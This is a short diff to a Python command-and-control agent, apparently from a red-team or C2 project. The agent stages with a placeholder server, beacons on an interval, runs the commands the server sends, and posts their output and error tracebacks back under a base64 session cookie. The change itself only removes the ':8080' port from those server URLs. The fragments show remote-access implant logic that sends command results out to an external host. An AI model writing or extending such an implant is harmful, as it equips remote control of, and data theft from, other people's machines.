@@ -18,7 +18,7 @@ import psutil
 server_url = "##SERVER_URL##"
 
 def staging(identifier):
-	url = f"http://{server_url}:8080/stage_0"
+	url = f"http://{server_url}/stage_0"
 	platform_name = platform.system()
 
 	## Check if ran as admin or not
@@ -35,7 +35,7 @@ def staging(identifier):
 ## Send out beacons for 60secs at 5secs interval
 def beacon(identifier):
 	start_time = time.time()
-	url = f"http://{server_url}:8080"
+	url = f"http://{server_url}"
 
 	while True:
 
@@ -95,7 +95,7 @@ def handle_commands(response, identifier):
 		## TODO - Add command successful or not?
 		## Send the command output back to server
 		if command_output:
-			url = f"http://{server_url}:8080/{res['command']}/output/{res['task_id']}"
+			url = f"http://{server_url}/{res['command']}/output/{res['task_id']}"
 			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 
 			r = requests.post(url = url,cookies = cookies, data = command_output)
@@ -108,7 +108,7 @@ def handle_commands(response, identifier):
 			os.remove(save_path)
 	except:
 		## Some error happened while handling commands, sent the traceback to server back
-		url = f"http://{server_url}:8080/clienterror"
+		url = f"http://{server_url}/clienterror"
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())
 
